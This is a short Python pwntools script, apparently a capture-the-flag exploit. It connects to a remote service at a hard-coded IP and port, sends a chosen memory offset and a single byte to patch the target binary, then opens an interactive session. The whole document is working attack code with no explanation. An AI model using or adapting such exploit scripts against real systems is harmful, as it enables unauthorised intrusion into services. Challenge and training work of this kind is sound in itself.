#!/usr/bin/env python3
from pwn import *

# context.binary = elf = ELF('./out')
context.terminal = 'kitty -e sh -c'.split()

def conn():
    if args.REMOTE:
        return remote('20.199.93.34', 13004 )
    else:
        return None
    

r = conn()

# 0x40129c

r.sendlineafter(b'offset: ', str(0x40129f).encode())
#gdb.attach(r)
r.sendlineafter(b'bytes: ', b'\x74')

r.interactive()